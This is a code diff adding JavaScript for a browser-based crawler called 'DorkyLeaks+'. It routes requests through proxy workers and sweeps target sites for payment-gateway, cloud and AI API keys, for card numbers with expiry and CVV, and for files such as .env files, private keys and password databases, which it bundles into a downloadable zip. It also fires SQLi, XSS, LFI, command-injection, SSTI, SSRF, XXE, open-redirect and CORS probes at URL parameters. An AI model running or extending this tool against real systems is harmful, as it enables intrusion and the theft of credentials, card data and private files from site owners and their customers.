+  if (w.dead) return Promise.resolve(null);
+  return new Promise(res => {
+    const id = ++jid;
+    const t = setTimeout(() => { pending.delete(id); res(null); }, ms);
+    pending.set(id, { w, t, res: m => { clearTimeout(t); res(m); } });
+    try { w.postMessage(Object.assign({}, msg, { id })); } catch { pending.delete(id); clearTimeout(t); res(null); }
+  });
+}
+function spawnWorker(wisp) {
+  pool = pool.filter(w => !w.dead);
+  return new Promise(res => {
+    WURL ||= URL.createObjectURL(new Blob(['(' + WORKER_SRC + ')()'], { type: 'text/javascript' }));
+    let w, done = false;
+    const finish = val => { if (!done) { done = true; clearTimeout(t); res(val); } };
+    const t = setTimeout(() => finish({ ok: false, why: 'worker: timeout' }), 45000);
+    try { w = new Worker(WURL); } catch (e) { return finish({ ok: false, why: 'worker: ' + e.message }); }
+    Object.assign(w, { ok: false, dead: false });
+    pool.push(w);
+    w.onmessage = e => {
+      const m = e.data;
+      if (m.t === 'ready') { w.ok = m.ok; w.why = m.why; w.wisp = m.wisp; finish(w); }
+      else { const f = pending.get(m.id); if (f) { pending.delete(m.id); f.res(m); } }
+    };
+    w.onerror = e => { w.ok = false; w.why = 'load: ' + (e.message || 'worker error'); finish(w); };
+    w.postMessage({ t: 'init', lib: LIBCURL, libm: LIBCURL_M, wisp, probes: PROBES });
+  });
+}
+async function startPool() {
+  pool.forEach(killWorker); pool = [];
+  let saved = '';
+  try { saved = localStorage.getItem('DL_wisp') || ''; } catch {}
+  const wl = [...new Set([...WISP_PARAM, saved, ...WISP_DEFAULT].filter(Boolean))];
+  setLive('on', 'connecting');
+  tlog('crawlLog', 'o', 'booting workers - ' + wl.length + ' wisp candidates', 'dim');
+  tlog('dorkLog', 'o', 'booting workers - ' + wl.length + ' wisp candidates', 'dim');
+  const first = await spawnWorker(wl);
+  if (!first.ok) {
+    setLive('bad', 'wisp failed');
+    tlog('crawlLog', 'x', 'wisp connect failed: ' + (first.why || '?'), 'bad');
+    tlog('dorkLog', 'x', 'wisp connect failed: ' + (first.why || '?'), 'bad');
+    return { ok: false, why: first.why || 'worker failed' };
+  }
+  try { localStorage.setItem('DL_wisp', first.wisp); } catch {}
+  tlog('crawlLog', '+', 'wisp ok: ' + first.wisp, 'hit');
+  tlog('dorkLog', '+', 'wisp ok: ' + first.wisp, 'hit');
+  const rest = await Promise.all(Array.from({ length: WORKERS - 1 }, (_, k) => spawnWorker(rot(wl, k + 1))));
+  rest.forEach((w, i) => { const ok = w && w.ok; tlog('crawlLog', ok ? '+' : 'x', 'worker ' + (i + 2) + '/' + WORKERS + ' ' + (ok ? 'ok' : (w && w.why || 'fail')), ok ? 'hit' : 'bad'); });
+  const alive = pool.filter(w => w.ok && !w.dead).length;
+  poolReady = alive > 0;
+  setLive(poolReady ? 'ok' : 'bad', poolReady ? 'ready(' + alive + ')' : 'no workers');
+  return { ok: poolReady, why: poolReady ? '' : 'no workers alive' };
+}
+async function httpFetch(url, opts) {
+  opts = opts || {};
+  const live = pool.filter(w => w.ok && !w.dead);
+  if (!live.length) throw new Error('no live workers');
+  const w = opts.worker || live[rr++ % live.length];
+  const L = opts.logId;
+  const M = (opts.method || 'GET').toUpperCase();
+  if (L) {
+    const extra = [];
+    if (opts.body) extra.push('body=' + humanSize(String(opts.body).length));
+    if (opts.redirect === 'manual') extra.push('no-follow');
+    tlog(L, '>', M + ' ' + trunc(url, 200) + (extra.length ? '  (' + extra.join(' ') + ')' : ''), 'req');
+  }
+  const m = await callWorker(w, { t: 'req', url: url, headers: opts.headers, ms: opts.ms || 25000, redirect: opts.redirect, cookie: opts.cookie, method: opts.method, body: opts.body }, (opts.ms || 25000) + 5000);
+  if (!m || m.text === undefined) { if (L) tlog(L, 'x', M + ' FAILED ' + trunc(url, 150), 'bad'); throw new Error('fetch failed'); }
+  const r = { status: m.status || 0, text: m.text || '', headers: { 'content-type': m.ct || '', 'set-cookie': m.setCookie || '', 'location': m.loc || '', 'access-control-allow-origin': m.acao || '' }, url: m.url || url, finalUrl: m.finalUrl || m.url || url, ms: m.ms || 0 };
+  if (L) {
+    const sz = humanSize(r.text.length), ct = (r.headers['content-type'] || '').split(';')[0].trim() || '?';
+    const cls = r.status >= 400 ? 'res4' : r.status >= 300 ? 'res3' : 'res2';
+    const glyph = r.status >= 400 ? 'x' : r.status >= 300 ? '>' : '+';
+    let line = r.status + ' - ' + sz + ' - ' + ct + ' - ' + r.ms + 'ms';
+    if (r.headers['location']) line += ' -> ' + trunc(r.headers['location'], 80);
+    tlog(L, glyph, line, cls);
+    if (r.headers['set-cookie']) tlog(L, 'k', 'Set-Cookie: ' + trunc(r.headers['set-cookie'], 120), 'cook');
+  }
+  return r;
+}
+
+/* ===== STATE ===== */
+const state = { findings: [], seen: new Set(), downloads: [], files: [], gateways: new Set(), queue: [], queueId: 0 };
+let PATHS = [];
+let abortFlag = false, pausedFlag = false, resumeWaiters = [];
+const waitResume = () => pausedFlag ? new Promise(r => resumeWaiters.push(r)) : Promise.resolve();
+function setPaused(p) {
+  pausedFlag = p;
+  $('prog').classList.toggle('paused', p);
+  $('pauseBtn').textContent = p ? 'Resume' : 'Pause';
+  if (!p) { const w = resumeWaiters; resumeWaiters = []; w.forEach(fn => fn()); }
+}
+const VULN_PREFIXES = ['SQLi','XSS','LFI','Path Traversal','CMDi','SSTI','SSRF','Open Redirect','XXE','JWT','CORS','Security Header','Clickjacking','SSL','Cache','Brute Force','Subdomain Takeover','HTTP Method','Admin','API','WordPress','WooCommerce','Cookie','CSRF','Info Disclosure'];
+const isVuln = t => VULN_PREFIXES.some(p => t.startsWith(p)) && !t.startsWith('Gateway:') && !t.startsWith('Nonce:');
+function addFinding(type, value, source, status) {
+  const k = type + '|' + value + '|' + source;
+  if (state.seen.has(k)) return false;
+  state.seen.add(k);
+  state.findings.push({ type: type, value: value, source: source || '', status: status || 'FORMAT_VALID' });
+  return true;
+}
+
+/* ===== SCANNERS ===== */
+function luhn(c) { if (!/^\d{13,19}$/.test(c)) return false; const d = c.split('').map(Number); let s = 0; for (let i = 0; i < d.length; i++) { let x = d[i]; if ((d.length - 1 - i) % 2 === 1) { x *= 2; if (x > 9) x -= 9; } s += x; } return s % 10 === 0; }
+function scanCards(content, source) {
+  const out = []; if (!content) return out;
+  for (const rule of CARD_RULES) {
+    const re = new RegExp(rule.r.source, rule.r.flags); let m;
+    while ((m = re.exec(content)) !== null) {
+      try {
+        let cn, mo, yr, cvv;
+        if (rule.c) { cn = rule.c.map(g => m[g]).join(''); mo = m[rule.o[0]]; yr = m[rule.o[1]]; cvv = m[rule.o[2]]; }
+        else { const g = rule.o.map(i => m[i] || ''); cn = g[0]; mo = g[1]; yr = g[2]; cvv = g[3]; if (rule.monthName) mo = MONTH_MAP[mo.charAt(0).toUpperCase() + mo.slice(1).toLowerCase()] || mo; }
+        if (!cn || !mo || !yr || !cvv) continue;
+        if (!luhn(cn)) continue; if (!/^\d{3,4}$/.test(cvv)) continue;
+        const mm = parseInt(mo, 10); if (mm < 1 || mm > 12) continue;
+        const yy = yr.length === 2 ? parseInt('20' + yr, 10) : parseInt(yr, 10);
+        const now = new Date();
+        if (new Date(yy, mm - 1, 1) < new Date(now.getFullYear(), now.getMonth(), 1)) continue;
+        out.push({ value: cn + '|' + String(mm).padStart(2, '0') + '|' + String(yy).slice(-2) + '|' + cvv, source: source });
+      } catch {}
+    }
+  }
+  return out;
+}
+function scanSecrets(content, source) {
+  const out = []; if (!content) return out;
+  for (const entry of SECRETS) {
+    const name = entry[0], re = entry[1], opts = entry[2];
+    const rx = new RegExp(re.source, re.flags); let m;
+    while ((m = rx.exec(content)) !== null) {
+      let val;
+      if (opts && opts.groups) val = opts.groups.map(i => m[i] || '').join('');
+      else val = m[1] || m[0];
+      if (!val || garbage(val)) continue;
+      if (opts) {
+        if (opts.minLen && val.length < opts.minLen) continue;
+        if (opts.minDistinct && dchars(val) < opts.minDistinct) continue;
+        if (opts.requireChars && !opts.requireChars.some(c => val.includes(c))) continue;
+        if (opts.requireSub && !opts.requireSub.every(s => val.includes(s))) continue;
+        if (opts.requireAny && !opts.requireAny.some(s => val.toLowerCase().includes(s))) continue;
+        if (opts.notStart && opts.notStart.some(s => val.startsWith(s))) continue;
+        if (opts.notEnd && opts.notEnd.some(s => val.endsWith(s))) continue;
+      }
+      if (hasPH(val)) continue;
+      out.push({ type: name, value: val, source: source });
+    }
+  }
+  return out;
+}
+function scanNonces(content, source) {
+  const out = []; if (!content) return out;
+  for (const entry of NONCE_PATTERNS) {
+    const name = entry[0], rxs = entry[1];
+    for (const re of rxs) {
+      const rx = new RegExp(re.source, re.flags); let m;
+      while ((m = rx.exec(content)) !== null) {
+        const val = m[1] || m[0];
+        if (!val || val.length < 6 || garbage(val)) continue;
+        out.push({ type: name, value: val, source: source });
+      }
+    }
+  }
+  return out;
+}
+function detectGateways(content) {
+  const found = []; if (!content) return found;
+  for (const entry of Object.entries(GATEWAY_SIGNATURES)) {
+    const name = entry[0], sig = entry[1];
+    if (sig.re.test(content)) {
+      found.push(name);
+      for (const ke of sig.keys) {
+        const keyName = ke[0], re = ke[1];
+        const rx = new RegExp(re.source, re.flags); let m;
+        while ((m = rx.exec(content)) !== null) { const v = m[1] || m[0]; if (!v || garbage(v)) continue; found.push('\x00' + keyName + '\x00' + v); }
+      }
+    }
+  }
+  return found;
+}
+function scanAll(res, url, logId) {
+  if (!res || !res.text) return { gateways: [] };
+  const ct = res.headers['content-type'] || '';
+  const isHtml = /html/i.test(ct) || res.text.slice(0, 2000).toLowerCase().includes('<!doctype html');
+  const L = logId;
+  tlog(L, 'i', 'INSPECT ' + humanSize(res.text.length) + ' - ' + (isHtml ? 'HTML' : ct || '?') + ' - ' + trunc(url, 120), 'dim');
+  const gws = detectGateways(res.text);
+  const foundGatewayNames = [];
+  for (const g of gws) {
+    if (g.startsWith('\x00')) { const parts = g.split('\x00'); const name = parts[1], val = parts[2]; if (addFinding(name, val, url, 'FORMAT_VALID')) tlog(L, '@', name + ' = ' + trunc(val, 80), 'gw'); }
+    else { state.gateways.add(g); if (addFinding('Gateway: ' + g, url, url, 'FORMAT_VALID')) tlog(L, '#', 'GATEWAY: ' + g, 'gw'); foundGatewayNames.push(g); }
+  }
+  const keepTypes = ['OpenAI','Anthropic','Stripe','PayPal','Braintree','Adyen','Square','Shopify','Slack','Google','AWS','Azure','GitHub','GitLab','NPM','PyPI','Doppler','Vault','DigitalOcean','Supabase','Firebase','Sentry','PostHog','Discord','Telegram','Mailgun','Mailchimp','SendGrid','Twilio','Mapbox'];
+  const secs = scanSecrets(res.text, url);
+  for (const f of secs) {
+    if (isHtml && !keepTypes.some(t => f.type.startsWith(t))) continue;
+    if (addFinding(f.type, f.value, url, 'FORMAT_VALID')) tlog(L, '*', f.type + ' = ' + trunc(f.value, 80), 'hit');
+  }
+  const cards = scanCards(res.text, url);
+  for (const c of cards) if (addFinding('Credit Card', c.value, url, 'FORMAT_VALID')) tlog(L, '$', 'CreditCard = ' + trunc(c.value, 60), 'hit');
+  const nonces = scanNonces(res.text, url);
+  for (const n of nonces) if (addFinding('Nonce: ' + n.type, n.value, url, 'FORMAT_VALID')) tlog(L, 'n', 'NONCE ' + n.type + ' = ' + trunc(n.value, 60), 'hit');
+  return { gateways: foundGatewayNames };
+}
+function extractLinks(html, base) {
+  const out = new Set();
+  try {
+    const doc = new DOMParser().parseFromString(html, 'text/html');
+    doc.querySelectorAll('a[href],script[src],link[href],iframe[src],form[action]').forEach(el => {
+      const href = el.getAttribute('href') || el.getAttribute('src') || el.getAttribute('action');
+      if (!href) return;
+      try { out.add(new URL(href, base).href.split('#')[0]); } catch {}
+    });
+  } catch {}
+  return [...out];
+}
+function extractForms(html, base) {
+  const out = [];
+  try {
+    const doc = new DOMParser().parseFromString(html, 'text/html');
+    doc.querySelectorAll('form').forEach(f => {
+      const action = f.getAttribute('action') || '';
+      const method = (f.getAttribute('method') || 'get').toUpperCase();
+      let url; try { url = new URL(action, base).href; } catch { return; }
+      const fields = [];
+      f.querySelectorAll('input,textarea,select').forEach(el => {
+        const n = el.getAttribute('name'); if (!n) return;
+        const t = (el.getAttribute('type') || '').toLowerCase();
+        if (t === 'submit' || t === 'button' || t === 'file' || t === 'image') return;
+        let v = el.getAttribute('value') || '';
+        if (t === 'password') v = 'password'; else if (t === 'email') v = 'test@example.com'; else if (t === 'hidden') v = v || 'x'; else if (!v) v = 'test';
+        fields.push({ name: n, value: v, type: t });
+      });
+      if (fields.length) out.push({ url: url, method: method, fields: fields });
+    });
+  } catch {}
+  return out;
+}
+function shouldSave(url, ct) {
+  ct = (ct || '').split(';')[0].trim().toLowerCase();
+  if (ct === 'text/html' || ct === 'application/xhtml+xml') return false;
+  const okCt = ['application/pdf','application/zip','application/x-tar','application/gzip','application/octet-stream','application/x-sql','application/sql','application/x-httpd-php','application/x-sh','application/x-pem-file','application/pkix-cert'];
+  if (okCt.some(p => ct.startsWith(p))) return true;
+  const ext = url.split('?')[0].split('.').pop().toLowerCase();
+  const okExt = ['env','sql','bak','backup','zip','tar','gz','tgz','7z','rar','pdf','csv','xml','json','yml','yaml','toml','ini','conf','cfg','pem','key','crt','cer','p12','pfx','jks','keystore','log','txt','properties','tfstate','tfvars','tf','hcl','db','sqlite','sqlite3','dump','ppk','ovpn','rdp','kdbx','sh','py','rb','js','ts','php','pl','ps1','bat','htpasswd','npmrc','pypirc','netrc','pgpass'];
+  return okExt.includes(ext);
+}
+function extractSpaRoutes(jsText) {
+  const routes = new Set(), pathRe = /["'`](\/[a-zA-Z0-9_\-/.~:@!$&'()*+,;=%?#]{1,160})["'`]/g; let m;
+  while ((m = pathRe.exec(jsText)) !== null) { const p = m[1].split('?')[0].split('#')[0]; if (/\.(png|jpg|jpeg|gif|svg|ico|woff|css|map)$/i.test(p)) continue; if (p.includes('${') || p.length < 2 || p === '/') continue; routes.add(p); }
+  return [...routes];
+}
+
+/* ===== QUEUE ===== */
+function scoreQueueItem(item) {
+  const hits = item.findings.length, path = item.name.toLowerCase();
+  const hotPaths = ['.env','config','secret','credential','password','token','key','.pem','.p12','.pfx','.jks','.keystore','.ppk','id_rsa','htpasswd','.netrc','.npmrc','.pypirc','pgpass','tfstate','tfvars'];
+  if (hits > 0 || hotPaths.some(h => path.includes(h))) return { level: 'hot', label: hits > 0 ? hits + ' hit' + (hits > 1 ? 's' : '') : 'sensitive path' };
+  const warnExt = ['sql','dump','bak','backup','log','db','sqlite','sqlite3'];
+  if (warnExt.includes(path.split('.').pop())) return { level: 'warn', label: path.split('.').pop() + ' file' };
+  return { level: 'ok', label: item.ct || 'file' };
+}
+function queueDownload(name, content, url, logId) {
+  const findings = [];
+  try {
+    const secs = scanSecrets(content, url); for (const f of secs) findings.push(f.type);
+    const cards = scanCards(content, url); if (cards.length) findings.push('Credit Card x' + cards.length);
+    const gws = detectGateways(content); for (const g of gws) findings.push(g.startsWith('\x00') ? g.split('\x00')[1] : 'Gateway: ' + g);
+  } catch {}
+  const item = { id: ++state.queueId, name: name, url: url, ct: '', size: content.length || content.byteLength || 0, content: content, findings: [...new Set(findings)], preview: String(content).slice(0, 400).replace(/\r?\n/g, '\n'), selected: findings.length > 0 };
+  state.queue.push(item);
+  renderQueueBadge(); renderQueueList();
+  if (logId) tlog(logId, 'q', 'QUEUED ' + name + ' - ' + humanSize(item.size) + (item.findings.length ? ' - ' + item.findings.length + ' hit(s)' : ''), item.findings.length ? 'hit' : 'dim');
+}
+function renderQueueBadge() { const badge = $('queueBadge'); const n = state.queue.length; if (badge) { badge.textContent = n; badge.style.display = n ? '' : 'none'; } }
+function renderQueueList() {
+  const el = $('queueList'); if (!el) return;
+  if (!state.queue.length) { el.innerHTML = '<div class="empty"><div class="g">o</div>Nothing queued yet</div>'; return; }
+  el.innerHTML = state.queue.map(item => {
+    const score = scoreQueueItem(item);
+    const pills = ['<span class="dq-pill ' + score.level + '">' + esc(score.label) + '</span>', '<span class="dq-pill">' + humanSize(item.size) + '</span>'].concat(item.findings.slice(0, 4).map(f => '<span class="dq-pill hot">' + esc(trunc(f, 28)) + '</span>')).join('');
+    const fname = item.name.split('/').pop() || item.name;
+    return '<div class="dq-item' + (item.selected ? ' selected' : '') + '" data-qid="' + item.id + '">' +
+      '<div class="dq-row">' +
+        '<input type="checkbox" class="dq-chk" data-qid="' + item.id + '"' + (item.selected ? ' checked' : '') + '>' +
+        '<div class="dq-meta">' +
+          '<div class="dq-name dq-view-btn" data-qid="' + item.id + '" title="' + esc(item.url) + '">' + esc(fname) + '</div>' +
+          '<div class="dq-pills">' + pills + '</div>' +
+          '<div class="dq-preview">' + esc(item.preview) + '</div>' +
+          '<div class="dq-actions">' +
+            '<button class="btn dq-view-btn" data-qid="' + item.id + '">View</button>' +
+            '<button class="btn dq-del-btn" data-qid="' + item.id + '">Delete</button>' +
+          '</div>' +
+        '</div>' +
+      '</div>' +
+    '</div>';
+  }).join('');
+  el.querySelectorAll('.dq-chk').forEach(chk => chk.addEventListener('change', () => { const id = +chk.dataset.qid; const item = state.queue.find(x => x.id === id); if (item) { item.selected = chk.checked; chk.closest('.dq-item').classList.toggle('selected', chk.checked); } }));
+  el.querySelectorAll('.dq-view-btn').forEach(btn => btn.addEventListener('click', () => viewFile(+btn.dataset.qid)));
+  el.querySelectorAll('.dq-del-btn').forEach(btn => btn.addEventListener('click', () => { const id = +btn.dataset.qid; state.queue = state.queue.filter(x => x.id !== id); renderQueueList(); renderQueueBadge(); }));
+}
+let fvCurrentId = null;
+function viewFile(id) {
+  const item = state.queue.find(x => x.id === id); if (!item) return;
+  fvCurrentId = id;
+  const fname = item.name.split('/').pop() || item.name;
+  $('fvTitle').textContent = fname; $('fvSub').textContent = humanSize(item.size) + ' - ' + item.url;
+  const findingsEl = $('fvFindings');
+  if (item.findings.length) findingsEl.innerHTML = item.findings.map(f => '<span class="dq-pill hot">' + esc(trunc(f, 40)) + '</span>').join('');
+  else findingsEl.innerHTML = '<span class="dq-pill ok">no secrets found</span>';
+  const MAX_VIEW = 200000, raw = String(item.content);
+  const shown = raw.length > MAX_VIEW ? raw.slice(0, MAX_VIEW) + '\n\n[...truncated]' : raw;
+  const hitPatterns = [];
+  try { const secs = scanSecrets(raw, item.url); for (const s of secs) if (s.value && s.value.length > 4) hitPatterns.push(s.value); } catch {}
+  let rendered = esc(shown);
+  for (const val of hitPatterns.slice(0, 20)) {
+    const ev = esc(val).replace(/[.*+?^${}()|[\]\\]/g, '\\$&');
+    try { rendered = rendered.replace(new RegExp(ev, 'g'), m => '<span class="fv-hit">' + m + '</span>'); } catch {}
+  }
+  $('fvBody').innerHTML = '<pre class="fv-code">' + rendered + '</pre>';
+  $('fvOverlay').classList.remove('hidden'); document.body.style.overflow = 'hidden';
+}
+function closeViewer() { $('fvOverlay').classList.add('hidden'); document.body.style.overflow = ''; fvCurrentId = null; }
+async function exportBundle() {
+  if (!state.queue.length && !state.findings.length) { toast('nothing to export'); return; }
+  toast('building zip...'); await sleep(30);
+  const zipFiles = {};
+  for (const item of state.queue) {
+    const safeName = 'files/' + item.name.replace(/^\/+/, '').replace(/[^a-zA-Z0-9._\-/]/g, '_');
+    zipFiles[safeName] = typeof item.content === 'string' ? fflate.strToU8(item.content) : new Uint8Array(item.content);
+  }
+  const payload = { generated: new Date().toISOString(), findings: state.findings, gateways: [...state.gateways], filesInBundle: state.queue.length };
+  zipFiles['findings.json'] = fflate.strToU8(JSON.stringify(payload, null, 2));
+  let report = '=== DorkyLeaks+ REPORT ===\n' + new Date().toISOString() + '\n\n';
+  if (state.gateways.size) report += 'Gateways: ' + [...state.gateways].join(', ') + '\n\n';
+  const groups = {};
+  for (const x of state.findings) (groups[x.type] = groups[x.type] || []).push(x);
+  for (const t of Object.keys(groups).sort()) { report += '--- ' + t + ' (' + groups[t].length + ') ---\n'; for (const x of groups[t]) { report += '  ' + x.value + ' [' + x.status + ']\n'; if (x.source) report += '    source: ' + x.source + '\n'; } report += '\n'; }
+  zipFiles['report.txt'] = fflate.strToU8(report);
+  fflate.zip(zipFiles, { level: 6 }, (err, data) => {
+    if (err) { toast('zip failed: ' + err.message); return; }
+    const blob = new Blob([data], { type: 'application/zip' });
+    const a = document.createElement('a'); a.href = URL.createObjectURL(blob); a.download = 'DorkyLeaks_' + Date.now() + '.zip'; a.style.display = 'none';
+    document.body.appendChild(a); a.click(); setTimeout(() => { URL.revokeObjectURL(a.href); a.remove(); }, 1000);
+    toast('downloaded ' + state.queue.length + ' files + reports');
+  });
+}
+
+/* ===== VULN SCANNER ===== */
+async function vulnScanUrl(url, logId) {
+  let u; try { u = new URL(url); } catch { return 0; }
+  const params = [...u.searchParams.keys()]; let count = 0;
+  const marker = 'dky' + Math.random().toString(36).slice(2, 8);
+  const L = logId;
+  tlog(L, '>', 'VULN-SCAN ' + trunc(url, 160) + ' [' + params.length + ' params]', 'hdr');
+  if (!params.length) { tlog(L, '.', 'no params - skipping', 'dim'); return 0; }
+  for (const p of params) {
+    if (abortFlag) break;
+    const orig = u.searchParams.get(p) || '';
+    const mk = (name, val) => { const t = new URL(url); t.searchParams.set(name, val); return t; };
+    tlog(L, '.', 'param "' + p + '" (orig="' + trunc(orig, 30) + '")', 'hdr');
+    for (const pay of SQLI_ERR_PAY) { if (abortFlag) break; try { const t = mk(p, orig + pay); tlog(L, '!', 'SQLi-err ?' + p + '=' + trunc(pay, 30), 'pay'); const r = await httpFetch(t.href, { ms: 12000 }); const low = (r.text || '').toLowerCase(); let hit = ''; for (const e of Object.entries(SQLI_ERR)) { const db = e[0], sigs = e[1]; if (sigs.some(s => low.includes(s))) { hit = db; break; } } if (hit) { tlog(L, 'X', 'SQLi(' + hit + ') CONFIRMED - ?' + p, 'vuln'); addFinding('SQLi (' + hit + ')', url + ' [param:' + p + ']', url, 'FORMAT_VALID'); count++; break; } } catch {} }
+    for (const pair of SQLI_BOOL) { if (abortFlag) break; try { const a = pair[0], b = pair[1]; const ta = mk(p, orig + ' ' + a), tb = mk(p, orig + ' ' + b); const [ra, rb] = await Promise.all([httpFetch(ta.href, { ms: 12000 }), httpFetch(tb.href, { ms: 12000 })]); const la = (ra.text || '').length, lb = (rb.text || '').length, delta = Math.abs(la - lb) / Math.max(la, lb); if (la > 100 && lb > 100 && delta > 0.25) { tlog(L, 'X', 'SQLi(bool) - delta ' + (delta * 100).toFixed(0) + '%', 'vuln'); addFinding('SQLi (boolean)', url + ' [param:' + p + ']', url, 'FORMAT_VALID'); count++; break; } } catch {} }
+    for (const test of SQLI_TIME) { if (abortFlag) break; try { const t = mk(p, test.pay); tlog(L, '!', 'SQLi-time(' + test.dbms + ') ?' + p, 'pay'); const t0 = performance.now(); await httpFetch(t.href, { ms: 12000 }); const dt = performance.now() - t0; if (dt > test.thresh) { tlog(L, 'X', 'SQLi(time/' + test.dbms + ') - ' + dt.toFixed(0) + 'ms', 'vuln'); addFinding('SQLi (time/' + test.dbms + ')', url + ' [param:' + p + ']', url, 'FORMAT_VALID'); count++; break; } } catch {} }
+    for (const pay of SQLI_EXTRACT) { if (abortFlag) break; try { const t = mk(p, pay); tlog(L, '!', 'SQLi-extract ?' + p, 'pay'); const r = await httpFetch(t.href, { ms: 12000 }); const body = r.text || ''; if (/XPATH syntax error|~[0-9a-z._-]{5,}/i.test(body)) { tlog(L, 'X', 'SQLi(extract) CONFIRMED', 'vuln'); addFinding('SQLi (extract)', url + ' [param:' + p + ']', url, 'FORMAT_VALID'); count++; break; } } catch {} }
+    for (const tpl of XSS_TPL) { if (abortFlag) break; const pay = tpl.replace('PAYLOAD', marker); try { const t = mk(p, pay); tlog(L, '!', 'XSS ?' + p, 'pay'); const r = await httpFetch(t.href, { ms: 12000 }); const body = r.text || ''; if (body.includes(marker) && body.includes(pay)) { tlog(L, 'X', 'XSS CONFIRMED', 'vuln'); addFinding('XSS (reflected)', url + ' [param:' + p + ']', url, 'FORMAT_VALID'); count++; break; } } catch {} }
+    for (const pay of LFI) { if (abortFlag) break; try { const t = mk(p, pay); tlog(L, '!', 'LFI ?' + p, 'pay'); const r = await httpFetch(t.href, { ms: 12000 }); if (LFI_SIGNS.some(s => (r.text || '').includes(s))) { tlog(L, 'X', 'LFI CONFIRMED', 'vuln'); addFinding('LFI', url + ' [param:' + p + ']', url, 'FORMAT_VALID'); count++; break; } } catch {} }
+    for (const pay of PATH_TRAV) { if (abortFlag) break; try { const t = mk(p, pay); tlog(L, '!', 'PathTrav ?' + p, 'pay'); const r = await httpFetch(t.href, { ms: 12000 }); if (LFI_SIGNS.some(s => (r.text || '').includes(s))) { tlog(L, 'X', 'PathTrav CONFIRMED', 'vuln'); addFinding('Path Traversal', url + ' [param:' + p + ']', url, 'FORMAT_VALID'); count++; break; } } catch {} }
+    for (const pay of CMDI) { if (abortFlag) break; try { const t = mk(p, orig + pay); tlog(L, '!', 'CMDi ?' + p, 'pay'); const r = await httpFetch(t.href, { ms: 12000 }); const body = r.text || ''; if (CMDI_SIGNS.find(s => matchSign(body, s))) { tlog(L, 'X', 'CMDi CONFIRMED', 'vuln'); addFinding('CMDi', url + ' [param:' + p + ']', url, 'FORMAT_VALID'); count++; break; } } catch {} }
+    for (const pair of SSTI) { if (abortFlag) break; try { const pay = pair[0], expect = pair[1]; const t = mk(p, pay); tlog(L, '!', 'SSTI ?' + p, 'pay'); const r = await httpFetch(t.href, { ms: 12000 }); const txt = r.text || ''; if (txt.includes(expect) && !txt.includes(pay)) { tlog(L, 'X', 'SSTI CONFIRMED', 'vuln'); addFinding('SSTI', url + ' [param:' + p + ']', url, 'FORMAT_VALID'); count++; break; } } catch {} }
+    if (SSRF_PARAMS.includes(p.toLowerCase())) { for (const pay of SSRF_PAY) { if (abortFlag) break; try { const t = mk(p, pay); tlog(L, '!', 'SSRF ?' + p, 'pay'); const r = await httpFetch(t.href, { ms: 12000 }); if (SSRF_SIGNS.some(s => (r.text || '').includes(s))) { tlog(L, 'X', 'SSRF CONFIRMED', 'vuln'); addFinding('SSRF', url + ' [param:' + p + ']', url, 'FORMAT_VALID'); count++; break; } } catch {} } }
+    if (REDIR_PARAMS.includes(p.toLowerCase())) { for (const pay of REDIR_PAY) { if (abortFlag) break; try { const t = mk(p, pay); tlog(L, '!', 'REDIR ?' + p, 'pay'); const r = await httpFetch(t.href, { ms: 12000, redirect: 'manual' }); const loc = r.headers['location'] || ''; if (loc && /evil\.com/i.test(loc)) { tlog(L, 'X', 'OpenRedirect -> ' + trunc(loc, 60), 'vuln'); addFinding('Open Redirect', url + ' [param:' + p + ']', url, 'FORMAT_VALID'); count++; break; } } catch {} } }
+  }
+  for (const pair of [[XXE_PAY_FILE, 'file-read'], [XXE_PAY_OOB, 'oob-ssrf']]) {
+    if (abortFlag) break;
+    const xxeBody = pair[0], xxeLabel = pair[1];
+    for (const ct of ['application/xml', 'text/xml']) {
+      if (abortFlag) break;
+      try { tlog(L, '!', 'XXE(' + xxeLabel + ') POST ' + ct, 'pay'); const r = await httpFetch(url, { method: 'POST', headers: { 'Content-Type': ct }, body: xxeBody, ms: 12000 }); const body = r.text || ''; if (LFI_SIGNS.find(s => body.includes(s)) || SSRF_SIGNS.find(s => body.includes(s))) { tlog(L, 'X', 'XXE CONFIRMED', 'vuln'); addFinding('XXE', url + ' [POST ' + ct + ']', url, 'FORMAT_VALID'); count++; break; } } catch {}
+    }
+  }
+  if (!abortFlag) { const spoofed = 'https://evil-cors-test.example.com'; try { const rc = await httpFetch(url, { headers: { 'Origin': spoofed }, ms: 12000 }); const acao = (rc.headers && (rc.headers['access-control-allow-origin'] || '')) || ''; if (acao === '*' || acao.includes('evil-cors-test')) { tlog(L, 'X', 'CORS - ACAO=' + trunc(acao, 60), 'vuln'); addFinding('CORS', url + ' [ACAO:' + acao + ']', url, 'FORMAT_VALID'); count++; } } catch {} }
+  tlog(L, 'o', 'VULN-SCAN done - ' + count + ' hits', count ? 'vuln' : 'dim');
+  return count;
+}
+
+/* ===== CRAWLER ===== */
+async function crawlSite(base, logId) {
+  logId = logId || 'crawlLog';
+  const L = logId;
+  let domain, origin;
+  try { const u = new URL(base); domain = u.hostname; origin = u.protocol + '//' + u.host; }
+  catch { tlog(L, 'x', 'invalid url: ' + base, 'bad'); return { files: 0, hits: 0, probed: 0, vulns: 0, gateways: 0 }; }
+  const visited = new Set(), vulnQueue = new Set(), queue = [base];
+  const extraPaths = new Set();
+  let savedFiles = 0, hitPaths = 0, probedPaths = 0, vulnHits = 0;
+  tlog(L, '=', '=======================================', 'hdr');
+  tlog(L, '=', 'TARGET ' + base, 'hdr');
+  tlog(L, '.', 'domain=' + domain + ' origin=' + origin, 'dim');
+
+  tlog(L, '>', 'PHASE 0 - recon', 'hdr');
+  const reconPaths = ['/robots.txt', '/sitemap.xml', '/.well-known/security.txt', '/.well-known/openid-configuration'];
+  const reconResults = await Promise.allSettled(reconPaths.map(p => httpFetch(origin + p, { ms: 12000, logId: L })));
+  for (let i = 0; i < reconResults.length; i++) {
+    const r = reconResults[i];
+    if (r.status !== 'fulfilled' || r.value.status >= 400) continue;
+    const u = origin + reconPaths[i];
+    visited.add(u.replace(/\/$/, ''));
+    const scan = scanAll(r.value, u, L);
+    for (const g of scan.gateways) for (const ep of (GATEWAY_ENDPOINTS[g] || [])) extraPaths.add(origin + ep);
+    if (reconPaths[i] === '/robots.txt') {
+      const sm = r.value.text.match(/Sitemap:\s*(https?:\S+)/gi) || [];
+      for (const m of sm) { const s = m.replace(/Sitemap:\s*/i, '').trim(); if (s.startsWith('http')) { queue.push(s); tlog(L, '.', 'robots sitemap: ' + s, 'dim'); } }
+    }
+  }
+
+  tlog(L, '>', 'PHASE 1 - bfs crawl', 'hdr');
+  let batchNo = 0;
